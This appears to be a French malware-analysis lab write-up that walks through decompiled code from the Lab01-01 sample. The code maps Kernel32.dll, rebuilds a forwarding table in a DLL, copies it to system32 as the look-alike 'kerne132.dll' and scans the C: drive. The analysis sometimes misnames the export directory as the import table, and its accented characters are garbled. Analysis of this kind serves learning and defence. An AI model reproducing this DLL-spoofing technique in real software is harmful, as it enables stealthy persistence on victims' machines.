```
      hFile = CreateFileA("C:\\Windows\\System32\\Kernel32.dll",0x80000000,1,
                          (LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
      pvVar6 = CreateFileMappingA(hFile,(LPSECURITY_ATTRIBUTES)0x0,2,0,0,(LPCSTR)0x0);
      pvVar7 = MapViewOfFile(pvVar6,4,0,0,0);
      pvVar6 = CreateFileA("Lab01-01.dll",0x10000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
      if (pvVar6 == (HANDLE)0xffffffff) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      hFileMappingObject = CreateFileMappingA(pvVar6,(LPSECURITY_ATTRIBUTES)0x0,4,0,0,(LPCSTR)0x0);
      if (hFileMappingObject == (HANDLE)0xffffffff) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      pvVar8 = MapViewOfFile(hFileMappingObject,0xf001f,0,0,0);
      if (pvVar8 == (LPVOID)0x0) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
```
| Action     | Fichier                   | Droit    | Objectif                        |
| ---------- | ------------------------- | -------- | ------------------------------- |
| Open + map | `Kernel32.dll`            | Lecture  | Lire son contenu PE             |
| Open + map | `Lab01-01.dll`            | Ã‰criture | Ã‰craser ou modifier son contenu |
| Quitte     | si un des mappings Ã©choue | â€“        | SÃ©curitÃ©                        |

```
int FUN_00401040(uint param_1,int param_2,int param_3)

{
  int iVar1;
  
  iVar1 = FUN_00401000(param_1,param_2);
  if (iVar1 == 0) {
    return 0;
  }
  return (*(int *)(iVar1 + 0x14) - *(int *)(iVar1 + 0xc)) + param_1 + param_3;
}
```
ğŸ“Œ But :
Convertit une RVA (Relative Virtual Address) en adresse mÃ©moire rÃ©elle dans un fichier PE mappÃ©.

ğŸ“ Utilisation classique dans PE parsing :

AccÃ©der aux structures comme la Import Table, Name Table, etc.

```
int FUN_00401070(uint param_1,int param_2,int param_3)

{
  int iVar1;
  
  iVar1 = FUN_00401000(param_1,param_2);
  if (iVar1 == 0) {
    return 0;
  }
  return (*(int *)(iVar1 + 0xc) - *(int *)(iVar1 + 0x14)) - param_3;
}
```
ğŸ“Œ But :
Calcule un offset relatif Ã  partir dâ€™une RVA et de la position rÃ©elle en mÃ©moire.

ğŸ“ Utilisation probable ici :

Calcule la position dâ€™Ã©criture dans le fichier cible (Lab01-01.dll), lÃ  oÃ¹ les donnÃ©es importÃ©es vont Ãªtre copiÃ©es.


```
 iVar22 = *(int *)((int)pvVar7 + 0x3c) + (int)pvVar7;
      puVar9 = (undefined4 *)FUN_00401040(*(undefined4 *)(iVar22 + 0x78),iVar22,pvVar7);
      iVar5 = *(int *)((int)pvVar8 + 0x3c) + (int)pvVar8;
      puVar10 = (undefined4 *)FUN_00401040(*(undefined4 *)(iVar5 + 0x78),iVar5,pvVar8);
      local_38 = (int *)FUN_00401040(puVar9[7],iVar22,pvVar7);
      puVar11 = (ushort *)FUN_00401040(puVar9[9],iVar22,pvVar7);
      puVar12 = (undefined4 *)FUN_00401040(puVar9[8],iVar22,pvVar7);
      uVar16 = *(uint *)(iVar5 + 0x7c);
      iVar5 = FUN_00401070(*(undefined4 *)(iVar5 + 0x78),iVar5,pvVar8);
```
ğŸ”¸ Il lit le contenu de Kernel32.dll (fichier systÃ¨me) en mÃ©moire.
ğŸ”¸ Il accÃ¨de Ã  son Import Table (liste des fonctions/DLL importÃ©es).
ğŸ”¸ Il fait la mÃªme chose pour un autre fichier Lab01-01.dll (copie personnalisÃ©e).
ğŸ”¸ Ensuite, il rÃ©cupÃ¨re des structures importantes comme :

OriginalFirstThunk â†’ noms des fonctions Ã  importer

FirstThunk â†’ emplacement pour Ã©crire les adresses importÃ©es

Name â†’ nom des DLLs importÃ©es
ğŸ”¸ Il mesure la taille des donnÃ©es Ã  copier.
ğŸ”¸ Et enfin, il calcule oÃ¹ Ã©crire dans Lab01-01.dll ces donnÃ©es d'import.

```
puVar20 = puVar9;
puVar18 = puVar10;
for (uVar15 = uVar16 >> 2; uVar15 != 0; uVar15--) {
  *puVar18 = *puVar20;
  puVar20++;
  puVar18++;
}
for (uVar16 = uVar16 & 3; uVar16 != 0; uVar16--) {
  *(undefined1 *)puVar18 = *(undefined1 *)puVar20;
  puVar20 = (undefined4 *)((int)puVar20 + 1);
  puVar18 = (undefined4 *)((int)puVar18 + 1);
}
```
ğŸ“Œ Ce que Ã§a fait :

Copie un bloc mÃ©moire de puVar9 â†’ puVar10 (donnÃ©es de la Import Table de Kernel32.dll â†’ vers Lab01-01.dll)

OptimisÃ© : 1er loop fait la copie mot par mot (4 bytes), 2e loop fait le reste byte par byte.

uVar16 = taille des donnÃ©es Ã  copier (SizeOfInitializedData vue dans bloc prÃ©cÃ©dent)

âœ… Objectif : injecter les imports de Kernel32.dll dans la nouvelle DLL.


```
iVar17 = puVar9[5];        // nombre de fonctions ?
puVar10[5] = iVar17;       // copier vers DLL cible
pcVar19 = (char *)(puVar10 + 10);
puVar10[6] = puVar9[6];    // autre champ PE
puVar10[3] = pcVar19 + iVar5;
puVar20 = puVar10 + 0xe;
```
ğŸ“Œ Copie de champs spÃ©cifiques entre puVar9 (Import Descriptor original) et puVar10 (dans la DLL modifiÃ©e).
Ensuite, il positionne pcVar19 sur un buffer mÃ©moire destinÃ© Ã  recevoir des chaÃ®nes de caractÃ¨res.

```
pcVar19[0] = 'k';
pcVar19[1] = 'e';
pcVar19[2] = 'r';
pcVar19[3] = 'n';

pcVar19 = (char *)(puVar10 + 0xb);
pcVar19[0] = 'e';
pcVar19[1] = '1';
pcVar19[2] = '3';
pcVar19[3] = '2';

pcVar19 = (char *)(puVar10 + 0xc);
pcVar19[0] = '.';
pcVar19[1] = 'd';
pcVar19[2] = 'l';
pcVar19[3] = 'l';

puVar10[0xd] = 0;
```
âœ… Ce nom ressemble Ã  "kernel32.dll" â†’ donc on est sÃ»rement dans une tentative dâ€™usurpation ou camouflage (malware typique).


```
iVar3 = puVar10[5]; // nombre dâ€™Ã©lÃ©ments
pcVar19 = (char *)(puVar20 + iVar17 * 4);

puVar10[7] = (undefined1 *)((int)puVar20 + iVar5);
puVar10[9] = (undefined1 *)((int)puVar20 + iVar5 + iVar3 * 4);
puVar10[8] = (undefined1 *)((int)puVar20 + iVar5 + iVar3 * 8);
```
ğŸ“Œ Ce bloc calcule des pointeurs dans la zone mÃ©moire allouÃ©e pour :

Table des noms (OriginalFirstThunk)

Table des adresses (FirstThunk)

Table des offsets internes


```
iVar17 = 0;
param_2 = 0;
local_28 = 0;
```
ğŸ“Œ PrÃ©pare une boucle (probablement qui vient juste aprÃ¨s) â€” souvent utilisÃ©e pour itÃ©rer sur les entrÃ©es d'import.


```
if (puVar9[5] != 0) {
  do {
    if ((*local_38 != 0) && (local_2c = 0, puVar9[6] != 0)) {
```
ğŸ“Œ puVar9[5] = nombre d'entrÃ©es dans OriginalFirstThunk
ğŸ“Œ puVar9[6] = nombre total d'importations
ğŸ“Œ *local_38 = entrÃ©e d'import active

â†’ Sâ€™il y a des fonctions importÃ©es, on commence Ã  les traiter une par une.

```
puVar18 = puVar20 + iVar17;
local_44 = (undefined2 *)((int)puVar20 + iVar17 * 2 + iVar3 * 4);
local_40 = puVar11;
local_3c = puVar12;
```
ğŸ“Œ puVar18 : pointeur vers la destination (table d'import reconstruite)
ğŸ“Œ local_44 : pointeur vers l'entrÃ©e de Hint/Ordinal
ğŸ“Œ local_40, local_3c : pointeurs vers les entrÃ©es Name et Hint/Name

```
do {
  if (*local_40 == local_28) {
```
ğŸ“Œ Si *local_40 == local_28, Ã§a veut dire quâ€™on a trouvÃ© le nom de fonction correspondant Ã  cette entrÃ©e d'import.


```
pcVar13 = (char *)FUN_00401040(*local_3c,iVar22,pvVar7);
```
ğŸ“Œ On rÃ©cupÃ¨re ici le nom de la fonction importÃ©e (comme "CreateFileA", "LoadLibraryA", etc.) depuis Kernel32.dll


```
uVar16 = 0xffffffff;
do { ... } while (cVar1 != '\0');
```
ğŸ“Œ On compte la longueur de la chaÃ®ne (calcul strlen Ã  la main).


```
// Copie mot par mot
for (...) *(undefined4 *)pcVar23 = *(undefined4 *)pcVar21;
// Puis octet par octet (reste de la chaÃ®ne)
```
ğŸ“Œ On copie le nom de la fonction dans une zone mÃ©moire prÃ©vue dans Lab01-01.dll.


```
*local_44 = (undefined2)param_2;
```
ğŸ“Œ On Ã©crit lâ€™indice de la fonction dans la Hint/Ordinal Table.


```
puVar18[iVar3 * 2] = pcVar19 + iVar5;
*puVar18 = pcVar21 + iVar5;
```
ğŸ“Œ Mise Ã  jour de OriginalFirstThunk et FirstThunk dans la structure PE.


```
builtin_strncpy(pcVar19 + ~uVar16, "Kernel32.", 9);
```
ğŸ“Œ PrÃ©pare une chaÃ®ne comme "Kernel32.CreateFileA" (probablement pour lier plus tard)


```
param_2 = param_2 + 1;
pcVar19 = pcVar21 + ~uVar16 + 9;
local_44++;
puVar18++;
...
local_40++; local_3c++; local_2c++;
```
ğŸ“Œ On avance tous les pointeurs dans les tableaux pour traiter la prochaine fonction.


```
local_28++;     // prochaine fonction
local_38++;     // prochain pointeur dans la thunk table
```
Sorties de boucle 

```
CloseHandle(hFile);
CloseHandle(pvVar6);
BVar14 = CopyFileA("Lab01-01.dll","C:\\windows\\system32\\kerne132.dll",0);
if (BVar14 == 0) {
  exit(0);
}
FUN_004011e0("C:\\*", 0);
```
ğŸ“Œ RÃ©sumÃ© :
ğŸ” Ferme les handles ouverts sur Kernel32.dll et Lab01-01.dll.

ğŸ“‚ Copie Lab01-01.dll vers C:\Windows\System32\kerne132.dll
âœ Ã‡a crÃ©e une copie dÃ©guisÃ©e dâ€™une DLL systÃ¨me, trÃ¨s similaire Ã  kernel32.dll â†’ usurpation de nom.

ğŸ§  Si la copie Ã©choue, le programme quitte.

ğŸ”„ Appelle la fonction rÃ©cursive FUN_004011e0("C:\\*", 0) pour probablement **parcourir tout le disque C:**.

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```



